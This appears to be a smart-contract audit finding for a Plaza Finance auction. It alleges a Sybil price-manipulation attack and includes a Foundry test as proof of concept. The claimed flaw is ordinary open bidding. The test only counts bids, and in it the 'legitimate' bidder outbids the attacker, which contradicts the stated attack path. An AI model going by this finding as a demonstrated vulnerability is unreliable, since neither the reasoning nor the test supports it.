# Attacker will manipulate the auction price using multiple fake identities

### Summary

The lack of bidder identity verification will cause a Sybil Attack for legitimate bidders as the attacker will create multiple fake accounts to place bids and manipulate the auction price.

### Root Cause

[`Auction.sol:125-171`](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L125-171) This is the normal flow of the bidding where multiple address can compete in bidding. It is the attacker who is taking advantage of that.

### Internal Pre-conditions

_No response_

### External Pre-conditions

Attacker must have different accounts with enough balance to execute this attack

### Attack Path

1. The attacker creates or controls multiple fake accounts or addresses.
2. The attacker places progressively higher bids using their fake accounts to artificially inflate the auction price.
3. The attacker continues placing bids through their fake identities until they have manipulated the auction price or secured the winning bid.
4. A legitimate bidder attempts to place a bid but is outbid by the attackerâ€™s fake identities.

### Impact

The legitimate bidders suffer an approximate loss of fair market competition as they cannot place a winning bid due to the inflated price. The attacker gains control of the auction outcome, either winning the auction or driving up the price unfairly.

### PoC

```solidity
function testSybilAttackPriceManipulation() public {
    // Setup multiple bidder addresses
    address bidder1 = address(0x11111111);
    address bidder2 = address(0x22222222);
    address bidder3 = address(0x33333333);
    address legitimateBidder = address(0x44444444444);

    uint256 slot = auction.slotSize();
    
    // Give tokens to all bidders
    usdc.mint(bidder1, 1000 ether);
    usdc.mint(bidder2, 1000 ether);
    usdc.mint(bidder3, 1000 ether);
    usdc.mint(legitimateBidder, 1000 ether);

    // Attacker's first bid (relatively low)
    vm.startPrank(bidder1);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(1 ether, slot); // Low price bid
    vm.stopPrank();

    // Attacker's second bid (slightly higher)
    vm.startPrank(bidder2);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(2 ether, slot); // Small increment
    vm.stopPrank();

    // Attacker's third bid (slightly higher again)
    vm.startPrank(bidder3);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(200 ether, slot); // Small increment
    vm.stopPrank();

    // Legitimate bidder trying to participate
    vm.startPrank(legitimateBidder);
    usdc.approve(address(auction), 1000 ether);
    auction.bid(250 ether, slot); // Fair market value bid
    vm.stopPrank();

    // Assert the manipulation
    assertEq(auction.bidCount(), 4, "Should have 4 bids");
  }
```
